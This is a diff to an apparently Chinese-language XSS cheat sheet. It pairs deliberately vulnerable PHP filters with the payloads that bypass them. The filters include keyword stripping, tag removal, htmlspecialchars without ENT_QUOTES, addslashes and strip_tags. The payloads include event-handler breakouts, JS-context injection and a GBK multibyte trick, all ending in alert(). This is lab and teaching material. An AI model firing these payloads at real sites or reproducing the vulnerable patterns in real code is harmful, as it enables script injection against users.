@@ -251,7 +251,7 @@ Chrome会动态修正一些节点，如将</script x\>修正为</script>，由�
 <img src="" onerror=" javascript:alert('xss3');">
 ```
 
-## a绕过
+## a绕过,javascript伪协议
 
 ```
 "><a href="javascript:alert(1)">click me</a><"
@@ -279,6 +279,61 @@ Chrome会动态修正一些节点，如将</script x\>修正为</script>，由�
 ```
 "><body onload=alert`1`><"
 " onfocus=alert`1` "
+```
+
+## 过滤`',",' '   `
+
+有时候用斜杠是可以代替空格的
+
+```
+<?php 
+    ini_set("display_errors", 0); 
+	$str = strtolower(@$_POST["keyword"]); 
+	while (strpos($str,'script')) {$str = str_replace('script', '', $str);} 
+	$str = str_replace('(', '', $str); 
+	$str = str_replace(')', '', $str); 
+	$str = str_replace(' ', '', $str); 
+	echo ' <form class="main" action="index.php" method="POST"> <input name=keyword size=60 value="'.$str.'"> <input type=submit name=submit value="Search"/> </form>'; echo '<p class="main">No results for "<b>'.htmlspecialchars($str).'</b>"</p>'; ?
+```
+
+```
+"/onfocus=alert`1`/"
+"><img/src='1'/onerror=alert`0`><"
+"><<svg/onload=alert`1`><"
+```
+
+## 过滤尖括号里边的所有东西
+
+```
+<?php 
+    ini_set("display_errors", 0); 
+	$str = strtolower(@$_POST["keyword"]); 
+	$str = preg_replace("/<.*?>/", '', $str);
+	echo ' <form class="main" action="index.php" method="POST"> <input name=keyword size=60 value="'.$str.'"> <input type=submit name=submit value="Search"/> </form>'; echo '<p class="main">No results for "<b>'.htmlspecialchars($str).'</b>"</p>'; ?
+```
+
+```
+" type=image src=x onerror=alert(1) "
+=> <input type=image src=x onerror=alert(1)>
+input会被当做img标签使用
+
+"/onfocus=alert`1`/"             => 不会自动触发
+```
+
+## js中的连接符
+
+```
+ <?php 
+ 	ini_set("display_errors", 0); 
+ 	$name = $_GET["name"]; 
+ 	echo '<h3 class="main">No results for "<b>'; echo htmlspecialchars($name).'</b>"</h3>'; echo ' <script> var t="'.$name.'"; var s="xxxxxxxx"; var d="dddd"; </script>'; ?> 
+```
+
+```
+这里就是一个新的输出点了，你的值是输出在js代码中的 只要闭合双引号，然后就可以写你自己的js代码了 比如 "-alert(1)-" 赋值给url中的name即可 -是js中的连接符号
+
+
+name=";alert(1);//
 ```
 
 ##  危险字符
@@ -313,4 +368,82 @@ Chrome会动态修正一些节点，如将</script x\>修正为</script>，由�
 > XMLHTTPRequest response
 >
 > Input.value
+
+## htmlspecialchars可绕过情况
+
+```
+echo "<input type=\"text\" value='" + htmlspecialchars($str) + "'>Please input the t1 as parameter";
+```
+
+```
+$str = ' onmouseover=alert(1) > //
+```
+
+因为htmlspecialchars默认只过滤`<`，`>`, `"`，`&`,默认为`ENT_COMPAT`
+
+```
+ENT_COMPAT - 默认。仅编码双引号。
+ENT_QUOTES - 编码双引号和单引号。
+ENT_NOQUOTES - 不编码任何引号。
+```
+
+## addslashes
+
+```
+echo "<input type=\"text\" value='" + addslashes($str) +"'>Please input the t1 as parameter";
+```
+
+paylaod1:
+
+```
+$str = ' onmouseover=alert(1) //
+=> 源码:
+<input type="text" value='\' onmouseover=alert(1) //'>Please input the t2 as parameter
+=> 浏览器处理结果:
+<input value="\" onmouseover="alert(1)//'" type="text">
+```
+
+在火狐里边也能触发，如果去掉 `//` 则无法触发，应该是`//` 注释掉了后边的单引号，浏览器处理出现问题
+
+如果使用以上 payload,浏览器最终结果:
+
+```
+<input value="\" onmouseover="alert(1)//'" type="text">
+```
+
+如果去掉`//`
+
+```
+$str = ' onmouseover=alert(1) //
+=> 源码:
+<input type="text" value='\' onmouseover=alert(1)'>Please input the t2 as parameter
+=> 浏览器处理结果：
+<input type="text" value='\' onmouseover=alert(1)'>Please input the t2 as parameter
+```
+
+这时候，就无法触发alert。
+
+paylaod2: 
+
+这个payload只能在编码为gbk的情况下才能使用。
+
+```
+<meta charset="gbk">
+```
+
+```
+ %df'><script>alert(1)</script> //
+```
+
+## strip_tags绕过
+
+```
+echo '<input type="text" value="' + strip_tags($str) +'">Please input the t1 as parameter';
+```
+
+payload:
+
+```
+" onmouseover=alert(1) //
+```
 
